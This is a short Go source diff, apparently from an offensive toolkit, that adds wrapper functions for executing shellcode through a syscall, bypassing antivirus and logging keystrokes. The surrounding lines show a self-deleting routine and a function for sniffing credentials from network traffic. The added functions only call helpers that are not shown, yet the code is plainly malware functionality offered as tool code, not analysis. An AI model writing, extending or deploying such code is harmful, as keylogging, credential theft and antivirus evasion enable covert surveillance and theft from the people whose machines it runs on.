@@ -174,6 +174,18 @@ func Remove() {
 	os.Remove(os.Args[0])
 }
 
+func SysShellExec(shellcode []byte) {
+	SyscallExecute(shellcode)
+}
+
+func Bypass(rate int) {
+	BypassAV(rate)
+}
+
+func logKeys(logLocal *string) {
+	Keylogger(logLocal)
+}
+
 // CredentialsSniff is used to sniff network traffic for
 // private user information.
 func CredentialsSniff(ifac, interval string,
